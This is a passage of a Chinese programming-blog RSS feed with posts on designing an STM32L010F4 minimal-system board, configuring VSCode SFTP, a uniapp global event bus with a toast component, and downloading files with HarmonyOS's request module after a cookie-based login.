给你两个 句子 s1 和 s2 &amp;#xff0c;返回所有 不常用单词 的列表。返回列表中单词…阅读更多...随机数生成Math.random double val  Math.random();  生成的是[0,1]之间的浮点数&amp;#xff0c;  生成一个[120.500]区间的随机数 int and  Double.valueOf(Math.ceil(Math.random()*381120)).intValue();Math.ceil只取浮点数的整数部分  Math.random()的实现 private static final class R…阅读更多...从经济学原理看团队分工合作最近我接触到一个经济学概念叫"比较优势"。学过经济学的同学应该很熟悉&amp;#xff0c;但为了让不了解经济学的朋友们也能明白&amp;#xff0c;我们先来解释下什么是比较优势&amp;#xff0c;然后再谈谈为什么我认为这个原理应当被用在团队合作的分工当中。 
比较优势是19世纪初…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:43 +0000</pubDate>
    </item>
    <item>
      <title>STM32L010F4 最小系统设计</title>
      <link>https://www.ppmy.cn/news/1540927.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维STM32L010F4 最小系统设计news/2025/10/31 23:19:42/画一个 STM32L010F4 的测试板子...... by 矜辰所致前言最近需要用到一个新的 MCU： STM32L010F4 ，上次测试的 VL53L0X 需要移植到这个芯片上，网上一搜 STM32L010F4，都是介绍资料，没有最小系统，使用说明等。想着就自己画个最小系统的小板子把，反正以后用起来也有可以测试的板子，虽然简单，也得顺带记录一下。那本文的内容就是画一个 STM32L010F4 的最小系统板子。目录前言一、芯片基础了解1.1 关于晶振1.2 启动模式1.3 串口，调试接口等引脚二、原理图和PCB2.1 原理图设计2.2 PCB设计结语一、芯片基础了解本次使用的芯片带上后缀名字为 STM32L010F4P6 ，TSSOP20 封装的。在设计之前简单的看了下资料，其实也就主要看看 Pin definitions 引脚的功能部分 :1.1 关于晶振简单看过，然后在在立创商城查看这个芯片的时候显示是有验证PCB板子：但是验证 PCB 板子是以 STM32F030F4P6 为原型设计的，虽然是好像和 STM32L010F4 是 Pin to Pin 的，但是关键在于一个地方，时钟部分有点问题。参考图 2 脚和 3 脚是外接的 8M 高速晶振，但是 STM32L010F4 的 2 , 3 脚是 OSC32_IN 和 OSC32_OUT 是用来接外部 32.768 kHz 低速晶体振荡器的。所以还是不参考那张图，这里我们还有一个很好的办法，就是打开 STM32CubeMX ，在 RCC 部分选择时钟以后可以看到他的连接图：那需不需要和 F103 那些一样通常都要接外接高速晶振呢？在手册可以看到，STM32L010F4 具备一个精度在 1% 的16Mhz 内部晶振，相对来说还是可以的了：而且在 STM32L010F4 手册的 Pin definitions 好像没有看到外接电源的 IO 口，但是手册里面也有关于 HSE 的说明，那么这时候我们又可以用到 CubeMX，我们勾选一下使用外部晶振会怎样：上面可以看到，确实是可以接外部晶振的，但是只能接一个脚。通常来说，这样单引脚接入的时钟信号一般都是有源晶振（一般而言啊，不是所有单引脚都是）。这里额外提一下 有源晶振 和 无源晶振：.有源晶振之所以可以单引脚是因为有源晶振内部已经包含了振荡电路，它能够直接输出稳定的时钟信号，因此不需要额外的反馈引脚（例如 OSC_OUT 引脚）来形成振荡回路。.无源晶振需要两个引脚形成一个振荡回路，外部的石英晶体通过输入信号和反馈信号不断振荡，从而产生稳定的时钟信号。一般需要连接 MCU 的 OSC_IN 和 OSC_OUT 引脚。.OSC_IN 引脚：这个引脚接收到微控制器内部的驱动信号，施加在石英晶体上，开始激发其振荡。.OSC_OUT 引脚：这个引脚用来提供晶振振荡信号的反馈。振荡信号在晶体上产生后，反馈到微控制器的内部振荡电路，保持持续振荡。多说了一点关于晶振的问题，那回到本次设计，我们就不接外部高速晶振，直接用 STM32L010F4 的 HSI 。1.2 启动模式对于 STM32L010F4 的启动模式，手册上面有如下说明：我们熟悉的 STM32F系列一般都是由 BOOT1 和 BOOT0 共同决定的，但是 STM32L010F4 实际上没有 BOOT1 引脚，只有 BOOT0 。虽然手册上提到了 nBOOT1 ，这是一个内部选项位 。其实我们这里不用管太多，我们本次需要知道的是 STM32L010F4 不同的启动模式主要依赖于BOOT0引脚的状态 。主Flash存储器启动（Main Flash memory）配置：BOOT0 = 0（通过将BOOT0引脚连接到地）这是默认的启动模式，程序存储在内部Flash中，系统复位后直接从Flash启动程序。系统存储器启动（System memory）配置：BOOT0 = 1（通过将BOOT0引脚连接到高电平，通常是3.3V或Vdd）在这种模式下，系统存储器被映射到启动空间。系统存储器中通常存储了STM32自带的Bootloader程序，允许用户通过串行接口（如UART）将新的程序代码下载到Flash Memory中。内置SRAM启动（Embedded Memory）配置：通常不用于STM32L010F4，因为这种模式一般用于程序调试，而STM32L010F4的低功耗特性意味着它通常不用于频繁的程序调试。对于STM32L010F4，通常只需要关注BOOT0引脚的状态即可进行程序的下载和调试。如果需要从系统存储器启动，只需将BOOT0引脚拉高即可。所以我们在设计的时候需要把 PB9 - BOOT0 拉低接地。1.3 串口，调试接口等引脚时钟看完了，我们这里还是可以根据 CubeMX 直接勾选看看效果。SYS -&gt; Debug Serial Wire 烧录调试接口Connectiviyt 里面的 两个串口调试接口我们需要用到，串口计划预留一个做打印串口。这么一来，其实剩下的就是一些 IO 口了，如下图：通过上面的了解，我们应该也知道了对于 STM32L010F4 MCU ，哪些是必须要用的 IO ，哪些是可以接外设的 IO，下面我们就可以开始最小系统板子的设计了。二、原理图和PCB这次的设计，除了把能用的 IO 口引出来，还需要测试一下在 STM32L010F4 上面使用 VL53L0X ，所以我们除了基本的最小系统板子的设计，也会附带一下连接 VL53L0X 的电路图（传感器小板子还是用我自己画的那块小板子）。2.1 原理图设计先画一个芯片整体部分，外接32.768kHz 的晶振，复位引脚，BOOT0 接地，电源和 GND 画好：然后是供电部分，和串口通讯部分，就画在一起了，串口加上一个跳线端子，方便后期 IO 口用作其他用途：其实到这里，这样画出来的板子就可以测试起来了，我们再把与传感器的连接部分补上：最后，最后加上一个按键，一个 LED灯，再把 IO 口引成排针，基本就完成了：2.2 PCB设计因为只是一个测试板子，而且没有特殊要求，PCB 就很简单了，根据自己的习惯，布局连线就好了，感觉没有什么特别的地方，因为实在是简单没什么好说的。直接就是布局连线，画好了的结果如下图：上一下铺铜过后的图和 3D 效果图：完成，最后就是发出制板。最后补上一下实物图把，凑合看一下，也不是什么特别的板子：结语本文我们画了一个 STM32L010F4 最小系统板子，整体来说是很简单的。对于不了解的一款普通 32 位单片机来说，难点在于了解 芯片的时钟，以及启动模式，烧录调试引脚是哪些引脚以及怎么连接，剩下的基本就好说了。等样板到了，再来更新一下实物图，以及简单的测试情况说明。好了，本文就到这里，谢谢大家！http://www.ppmy.cn/news/1540927.html相关文章使用Vscode配置ftp连接远程服务器（上传本地文件）1.安装插件 扩展商店搜sftp，点击进行安装。 2.配置json文件 crtl+shift+p 输入ftp配置命令 sftp:config {"name": "My Server",  //设置名字"host": "localhost"&lt;/阅读更多...uniapp上如何绑定全局事件总线（引入自定义全局组件例如弹窗）1、在main.js中挂载bus 
// main.js
Vue.prototype.$bus  new Vue();
uni.$bus  Vue.prototype.$bus;  // 确保在 uni 上绑定 
2、写一个全局弹窗组件 
&lt;template&gt;&lt;view v-if"visible" class"toast-container"&gt;&lt;view class"icon-conta…阅读更多...鸿蒙网络编程系列12-使用Request部件下载文件到本地示例1. Request下载文件简介 
在前述文章鸿蒙网络编程系列10-使用HttpRequest下载文件到本地示例中&amp;#xff0c;使用基础的HttpRequest模块演示了如何下载文件到本地&amp;#xff0c;整个下载过程看起来好像不太复杂&amp;#xff0c;但是&amp;#xff0c;如果考虑到可靠性、网络问题以及文件类型…阅读更多...图像处理中的图像重建图像重建是指通过对观测到的图像或图像数据进行处理和分析&amp;#xff0c;以恢复出原始或高质量的图像。图像重建常用于图像压缩、图像增强、图像修复等应用领域。 
以下是一些常见的图像重建方法&amp;#xff1a; 插值法&amp;#xff08;Interpolation&amp;#xff09;&amp;#xff1a;插值法是一…阅读更多...【从零开始的LeetCode-算法】884. 两句话中的不常见单词句子 是一串由空格分隔的单词。每个 单词 仅由小写字母组成。 
如果某个单词在其中一个句子中恰好出现一次&amp;#xff0c;在另一个句子中却 没有出现 &amp;#xff0c;那么这个单词就是 不常见的 。 
给你两个 句子 s1 和 s2 &amp;#xff0c;返回所有 不常用单词 的列表。返回列表中单词…阅读更多...随机数生成Math.random double val  Math.random();  生成的是[0,1]之间的浮点数&amp;#xff0c;  生成一个[120.500]区间的随机数 int and  Double.valueOf(Math.ceil(Math.random()*381120)).intValue();Math.ceil只取浮点数的整数部分  Math.random()的实现 private static final class R…阅读更多...从经济学原理看团队分工合作最近我接触到一个经济学概念叫"比较优势"。学过经济学的同学应该很熟悉&amp;#xff0c;但为了让不了解经济学的朋友们也能明白&amp;#xff0c;我们先来解释下什么是比较优势&amp;#xff0c;然后再谈谈为什么我认为这个原理应当被用在团队合作的分工当中。 
比较优势是19世纪初…阅读更多...Redis的6.0以上为啥又支持多线程Redis 在 6.0 版本之前一直采用单线程架构&amp;#xff0c;这是因为 Redis 主要是内存操作&amp;#xff0c;单线程模型足以应对大部分高性能场景。而单线程模型的优势在于避免了多线程带来的上下文切换和锁的开销&amp;#xff0c;使得 Redis 保持极高的性能和简单性。 
然而&amp;#xff0c;随着…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:42 +0000</pubDate>
    </item>
    <item>
      <title>使用Vscode配置ftp连接远程服务器（上传本地文件）</title>
      <link>https://www.ppmy.cn/news/1540926.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维使用Vscode配置ftp连接远程服务器（上传本地文件）news/2025/10/31 23:19:41/1.安装插件扩展商店搜sftp，点击进行安装。2.配置json文件crtl+shift+p 输入ftp配置命令sftp:config{"name":"My Server",//设置名字"host":"localhost"&lt;/http://www.ppmy.cn/news/1540926.html相关文章uniapp上如何绑定全局事件总线（引入自定义全局组件例如弹窗）1、在main.js中挂载bus 
// main.js
Vue.prototype.$bus  new Vue();
uni.$bus  Vue.prototype.$bus;  // 确保在 uni 上绑定 
2、写一个全局弹窗组件 
&lt;template&gt;&lt;view v-if"visible" class"toast-container"&gt;&lt;view class"icon-conta…阅读更多...鸿蒙网络编程系列12-使用Request部件下载文件到本地示例1. Request下载文件简介 
在前述文章鸿蒙网络编程系列10-使用HttpRequest下载文件到本地示例中&amp;#xff0c;使用基础的HttpRequest模块演示了如何下载文件到本地&amp;#xff0c;整个下载过程看起来好像不太复杂&amp;#xff0c;但是&amp;#xff0c;如果考虑到可靠性、网络问题以及文件类型…阅读更多...图像处理中的图像重建图像重建是指通过对观测到的图像或图像数据进行处理和分析&amp;#xff0c;以恢复出原始或高质量的图像。图像重建常用于图像压缩、图像增强、图像修复等应用领域。 
以下是一些常见的图像重建方法&amp;#xff1a; 插值法&amp;#xff08;Interpolation&amp;#xff09;&amp;#xff1a;插值法是一…阅读更多...【从零开始的LeetCode-算法】884. 两句话中的不常见单词句子 是一串由空格分隔的单词。每个 单词 仅由小写字母组成。 
如果某个单词在其中一个句子中恰好出现一次&amp;#xff0c;在另一个句子中却 没有出现 &amp;#xff0c;那么这个单词就是 不常见的 。 
给你两个 句子 s1 和 s2 &amp;#xff0c;返回所有 不常用单词 的列表。返回列表中单词…阅读更多...随机数生成Math.random double val  Math.random();  生成的是[0,1]之间的浮点数&amp;#xff0c;  生成一个[120.500]区间的随机数 int and  Double.valueOf(Math.ceil(Math.random()*381120)).intValue();Math.ceil只取浮点数的整数部分  Math.random()的实现 private static final class R…阅读更多...从经济学原理看团队分工合作最近我接触到一个经济学概念叫"比较优势"。学过经济学的同学应该很熟悉&amp;#xff0c;但为了让不了解经济学的朋友们也能明白&amp;#xff0c;我们先来解释下什么是比较优势&amp;#xff0c;然后再谈谈为什么我认为这个原理应当被用在团队合作的分工当中。 
比较优势是19世纪初…阅读更多...Redis的6.0以上为啥又支持多线程Redis 在 6.0 版本之前一直采用单线程架构&amp;#xff0c;这是因为 Redis 主要是内存操作&amp;#xff0c;单线程模型足以应对大部分高性能场景。而单线程模型的优势在于避免了多线程带来的上下文切换和锁的开销&amp;#xff0c;使得 Redis 保持极高的性能和简单性。 
然而&amp;#xff0c;随着…阅读更多...Flink算子状态为何只能用ListState？前言 
Flink 将状态是否要按照 key 进行分类&amp;#xff0c;将状态分为键值状态&amp;#xff08;Keyed State&amp;#xff09;和算子状态&amp;#xff08;Operator State&amp;#xff09;两种&amp;#xff0c;两者除了状态本身的作用域不同外&amp;#xff0c;其中算子状态的状态类型更是被 Flink 限制为 Li…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:41 +0000</pubDate>
    </item>
    <item>
      <title>uniapp上如何绑定全局事件总线（引入自定义全局组件例如弹窗）</title>
      <link>https://www.ppmy.cn/news/1540925.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维uniapp上如何绑定全局事件总线（引入自定义全局组件例如弹窗）news/2025/10/31 23:19:40/1、在main.js中挂载bus// main.js
Vue.prototype.$bus = new Vue();
uni.$bus = Vue.prototype.$bus;  // 确保在 uni 上绑定2、写一个全局弹窗组件&lt;template&gt;&lt;view v-if="visible" class="toast-container"&gt;&lt;view class="icon-container"&gt;&lt;text class="icon"&gt;!&lt;/text&gt; &lt;!-- 圆形边框内的感叹号 --&gt;&lt;/view&gt;&lt;text class="toast-message"&gt;{{ message }}&lt;/text&gt;&lt;/view&gt;
&lt;/template&gt;&lt;script&gt;
export default {data() {return {visible: false,message: ''};},created() {this.$bus.$on('showToast', this.showToast);},methods: {showToast(message) {this.message = message;this.visible = true;setTimeout(() =&gt; {this.visible = false;}, 2000); // 2秒后自动隐藏}}
};
&lt;/script&gt;&lt;style scoped&gt;
.toast-container {position: fixed;bottom: 150rpx;left: 50%;transform: translateX(-50%);background-color: rgba(0, 0, 0, 0.7);padding: 10px 20px;border-radius: 5px;text-align: center; /* 文字居中 */z-index: 9999;
}.icon-container {width: 60rpx; /* 圆形的宽度 */height: 60rpx; /* 圆形的高度 */border: 2px solid white; /* 圆形的边框 */border-radius: 50%; /* 使其变为圆形 */display: flex; /* 使用 flexbox 居中内容 */align-items: center; /* 垂直居中 */justify-content: center; /* 水平居中 */margin: 0 auto 5px; /* 圆形和文本之间的间距 */
}.icon {color: white; /* 图标的颜色 */font-size: 24px; /* 图标的大小 */
}.toast-message {color: #fff;font-size: 18px; /* 调整字体大小 */
}
&lt;/style&gt;3、需要的地方引入使用uni.$bus.$emit('showToast', result.response.data.message);也可以在easycom中学习uniapp组件的全局引入方式"easycom": {"^u-(.*)": "@/uni_modules/uview-ui/components/u-$1/u-$1.vue","^my-(.*)": "@/componets/my-$1.vue",}其中$1就是my-后面的变量值。http://www.ppmy.cn/news/1540925.html相关文章鸿蒙网络编程系列12-使用Request部件下载文件到本地示例1. Request下载文件简介 
在前述文章鸿蒙网络编程系列10-使用HttpRequest下载文件到本地示例中&amp;#xff0c;使用基础的HttpRequest模块演示了如何下载文件到本地&amp;#xff0c;整个下载过程看起来好像不太复杂&amp;#xff0c;但是&amp;#xff0c;如果考虑到可靠性、网络问题以及文件类型…阅读更多...图像处理中的图像重建图像重建是指通过对观测到的图像或图像数据进行处理和分析&amp;#xff0c;以恢复出原始或高质量的图像。图像重建常用于图像压缩、图像增强、图像修复等应用领域。 
以下是一些常见的图像重建方法&amp;#xff1a; 插值法&amp;#xff08;Interpolation&amp;#xff09;&amp;#xff1a;插值法是一…阅读更多...【从零开始的LeetCode-算法】884. 两句话中的不常见单词句子 是一串由空格分隔的单词。每个 单词 仅由小写字母组成。 
如果某个单词在其中一个句子中恰好出现一次&amp;#xff0c;在另一个句子中却 没有出现 &amp;#xff0c;那么这个单词就是 不常见的 。 
给你两个 句子 s1 和 s2 &amp;#xff0c;返回所有 不常用单词 的列表。返回列表中单词…阅读更多...随机数生成Math.random double val  Math.random();  生成的是[0,1]之间的浮点数&amp;#xff0c;  生成一个[120.500]区间的随机数 int and  Double.valueOf(Math.ceil(Math.random()*381120)).intValue();Math.ceil只取浮点数的整数部分  Math.random()的实现 private static final class R…阅读更多...从经济学原理看团队分工合作最近我接触到一个经济学概念叫"比较优势"。学过经济学的同学应该很熟悉&amp;#xff0c;但为了让不了解经济学的朋友们也能明白&amp;#xff0c;我们先来解释下什么是比较优势&amp;#xff0c;然后再谈谈为什么我认为这个原理应当被用在团队合作的分工当中。 
比较优势是19世纪初…阅读更多...Redis的6.0以上为啥又支持多线程Redis 在 6.0 版本之前一直采用单线程架构&amp;#xff0c;这是因为 Redis 主要是内存操作&amp;#xff0c;单线程模型足以应对大部分高性能场景。而单线程模型的优势在于避免了多线程带来的上下文切换和锁的开销&amp;#xff0c;使得 Redis 保持极高的性能和简单性。 
然而&amp;#xff0c;随着…阅读更多...Flink算子状态为何只能用ListState？前言 
Flink 将状态是否要按照 key 进行分类&amp;#xff0c;将状态分为键值状态&amp;#xff08;Keyed State&amp;#xff09;和算子状态&amp;#xff08;Operator State&amp;#xff09;两种&amp;#xff0c;两者除了状态本身的作用域不同外&amp;#xff0c;其中算子状态的状态类型更是被 Flink 限制为 Li…阅读更多...算法训练（leetcode）二刷第五天 | 242. 有效的字母异位词、349. 两个数组的交集、202. 快乐数、1. 两数之和刷题记录 242. 有效的字母异位词349. 两个数组的交集202. 快乐数1. 两数之和 242. 有效的字母异位词 
leetcode题目地址 
简单题&amp;#xff0c;哈希表。数组长度为常量&amp;#xff0c;因此空间复杂度为O(1)。 
时间复杂度&amp;#xff1a;  O ( n ) O(n) O(n) 空间复杂度&amp;#xff1a;  O…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:40 +0000</pubDate>
    </item>
    <item>
      <title>鸿蒙网络编程系列12-使用Request部件下载文件到本地示例</title>
      <link>https://www.ppmy.cn/news/1540924.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维鸿蒙网络编程系列12-使用Request部件下载文件到本地示例news/2025/10/31 23:19:39/1. Request下载文件简介在前述文章鸿蒙网络编程系列10-使用HttpRequest下载文件到本地示例中，使用基础的HttpRequest模块演示了如何下载文件到本地，整个下载过程看起来好像不太复杂，但是，如果考虑到可靠性、网络问题以及文件类型和大小的差异，开发难度还是相当大的，幸运的是，鸿蒙提供了专门用来进行上传下载的API，把这些复杂性都封装了起来，这就是本示例要使用的request部件。2. request的常用方法鸿蒙封装的request对象位于模块request中，使用如下的方式导入：import request from '@ohos.request';request模块包括了众多的对象和操作方法，就本文而言，重点需要掌握的是downloadFile方法：downloadFile(context: BaseContext, config: DownloadConfig): Promise&lt;DownloadTask&gt;该方法执行异步下载，使用promise形式返回结果，结果为DownloadTask类型。可以通过DownloadTask类型的on('complete'|'pause'|'remove')订阅任务下载时的状态信息，包括任务完成、暂停或移除。通过on('fail')可获取任务下载时的错误信息。3. request下载示例本文要下载的服务端网站和鸿蒙网络编程系列10-使用HttpRequest下载文件到本地示例中的网站一样，也是需要登录后才可以下载，本示例运行后的界面如图所示：应用启动后首先配置用户名密码以及登录地址，然后单击“登录”按钮进行登录，成功登录后就可以单击“下载”按钮进行下载了，成功下载后会显示保存位置和下载的文件内容。下面详细介绍创建该应用的步骤。步骤1：创建Empty Ability项目。步骤2：在module.json5配置文件加上对权限的声明："requestPermissions": [{"name": "ohos.permission.INTERNET"}]这里添加了访问互联网的权限。步骤3：在Index.ets文件里添加如下的代码：import http from '@ohos.net.http';
import util from '@ohos.util';
import fs from '@ohos.file.fs';
import request from '@ohos.request';
import picker from '@ohos.file.picker';@Entry
@Component
struct Index {//连接、通讯历史记录@State msgHistory: string = ''//首页地址@State downloadUrl: string = "http://192.168.100.101:8081/download?filename=demo.txt"//登录地址@State loginUrl: string = "http://192.168.100.101:8081/auth"//用户名@State loginName: string = "zhanglei"//密码@State passwd: string = "cangjie"//下载到本地的路径@State localFilePath: string = ""scroller: Scroller = new Scroller()sessionId: string = ""build() {Row() {Column() {Text("Request下载示例").fontSize(14).fontWeight(FontWeight.Bold).width('100%').textAlign(TextAlign.Center).padding(10)Flex({ justifyContent: FlexAlign.Start, alignItems: ItemAlign.Center }) {Text("用户名：").fontSize(14).width(80).flexGrow(0)TextInput({ text: this.loginName }).onChange((value) =&gt; {this.loginName = value}).width(110).fontSize(11).flexGrow(1)Text("密码：").fontSize(14).width(60).flexGrow(0)TextInput({ text: this.passwd }).onChange((value) =&gt; {this.passwd = value}).type(InputType.Password).width(100).fontSize(11).flexGrow(1)}.width('100%').padding(10)Flex({ justifyContent: FlexAlign.Start, alignItems: ItemAlign.Center }) {Text("登录地址：").fontSize(14).width(80).flexGrow(0)TextInput({ text: this.loginUrl }).onChange((value) =&gt; {this.loginUrl = value}).width(100).fontSize(11).flexGrow(1)Button("登录").onClick(() =&gt; {this.login()}).width(70).fontSize(14).flexGrow(0)}.width('100%').padding(10)Flex({ justifyContent: FlexAlign.Start, alignItems: ItemAlign.Center }) {Text("文件地址：").fontSize(14).width(80).flexGrow(0)TextInput({ text: this.downloadUrl }).onChange((value) =&gt; {this.downloadUrl = value}).width(110).fontSize(11).flexGrow(1)Button("下载").onClick(() =&gt; {this.downloadFile()}).width(70).fontSize(14).flexGrow(0)}.width('100%').padding(10)Flex({ justifyContent: FlexAlign.Start, alignItems: ItemAlign.Center }) {Text("保存位置：").fontSize(14).width(80).flexGrow(0)TextInput({ text: this.localFilePath }).width(110).fontSize(11).flexGrow(1)}.width('100%').padding(10)Scroll(this.scroller) {Text(this.msgHistory).textAlign(TextAlign.Start).padding(10).width('100%').backgroundColor(0xeeeeee)}.align(Alignment.Top).backgroundColor(0xeeeeee).height(300).flexGrow(1).scrollable(ScrollDirection.Vertical).scrollBar(BarState.On).scrollBarWidth(20)}.width('100%').justifyContent(FlexAlign.Start).height('100%')}.height('100%')}//下载文件downloadFile() {this.localFilePath = getContext(this).tempDir + "/demo.txt"//文件如果已经存在，就删除if (fs.accessSync(this.localFilePath)) {fs.unlink(this.localFilePath)}let cfg: request.DownloadConfig = {url: this.downloadUrl,header: {'Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'zh-CN,zh;q=0.9',//这一步很关键，把登录成功后的cookie传递过去'Cookie': 'sessionid=' + this.sessionId,'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',},filePath: this.localFilePath }let downloadTask: request.DownloadTask;try {request.downloadFile(getContext(this), cfg, (err, data) =&gt; {if (err) {console.error('Failed to request the download. Cause: ' + JSON.stringify(err));return;}downloadTask = data;downloadTask.on("progress", (size, tot) =&gt; {this.msgHistory += `下载进度：${size}/${tot}\r\n`})downloadTask.on("complete", () =&gt; {this.msgHistory += "下载完成\r\n"//读取文件内容并显示this.showFileContent(this.localFilePath)})});} catch (err) {this.msgHistory += 'err.code : ' + err.code + ', err.message : ' + err.message;}}//显示指定文件的内容showFileContent(filePath: string) {let content = fs.readTextSync(filePath)this.msgHistory += "文件内容：" + content + "\r\n"}//模拟登录login() {//http请求对象let httpRequest = http.createHttp();//请求的登录名和密码参数let params = "username=" + this.loginName + "&amp;password=" + this.passwdlet opt: http.HttpRequestOptions = {method: http.RequestMethod.POST,extraData: params,header: { 'Content-Type': 'application/x-www-form-urlencoded' },expectDataType: http.HttpDataType.STRING}httpRequest.request(this.loginUrl, opt).then((resp) =&gt; {this.msgHistory += "响应码：" + resp.responseCode + "\r\n"//返回的首部信息中，cookie的格式为：// set-cookie: sessionid=19837d50s270ms999us100ns; Max-Age=1800; Path=///这里需要记录下sessionid，作为下次提交时的cookie信息let cookies: string = resp.header["set-cookie"]this.sessionId = cookies.split(";")[0].split("=")[1]this.msgHistory += "sessionId：" + this.sessionId + "\r\n"this.msgHistory += "登录成功\r\n"}).catch((e) =&gt; {this.msgHistory += "登录失败：" + e.message + "\r\n"})}
}步骤4：编译运行，可以使用模拟器或者真机。步骤5：配置网站首页地址和登录地址，然后单击“登录”按钮，就可以模拟登录了，登录后的页面如图所示：步骤6：单击“下载”按钮，应用会下载文件并保存到本地，然后从本地读取文件的内容（假设文件是文本类型的），如图所示：可以看到，文件成功保存到了本地并读取到了文件的内容。3. 下载功能分析要实现下载功能，关键点和使用httpRequest一样，也是要获取sessionId，并且在发起下载任务的DownloadConfig配置里通过header附加上sessionid，代码如下：let cfg: request.DownloadConfig = {url: this.downloadUrl,header: {'Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'zh-CN,zh;q=0.9',//这一步很关键，把登录成功后的cookie传递过去'Cookie': 'sessionid=' + this.sessionId,'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',},filePath: this.localFilePath }另外要注意的一点是，如果文件下载过一次，再次下载时会提示本地文件已经存在，这样就会下载失败，解决方法是在下载前判断文件是否存在，如果存在就先删除，代码如下：this.localFilePath = getContext(this).tempDir + "/demo.txt"//文件如果已经存在，就删除if (fs.accessSync(this.localFilePath)) {fs.unlink(this.localFilePath)}（本文作者原创，除非明确授权禁止转载）本文码云源码地址：https://gitee.com/zl3624/harmonyos_network_samples/tree/master/code/http/RequstDownload本系列码云源码地址：https://gitee.com/zl3624/harmonyos_network_sampleshttp://www.ppmy.cn/news/1540924.html相关文章图像处理中的图像重建图像重建是指通过对观测到的图像或图像数据进行处理和分析&amp;#xff0c;以恢复出原始或高质量的图像。图像重建常用于图像压缩、图像增强、图像修复等应用领域。 
以下是一些常见的图像重建方法&amp;#xff1a; 插值法&amp;#xff08;Interpolation&amp;#xff09;&amp;#xff1a;插值法是一…阅读更多...【从零开始的LeetCode-算法】884. 两句话中的不常见单词句子 是一串由空格分隔的单词。每个 单词 仅由小写字母组成。 
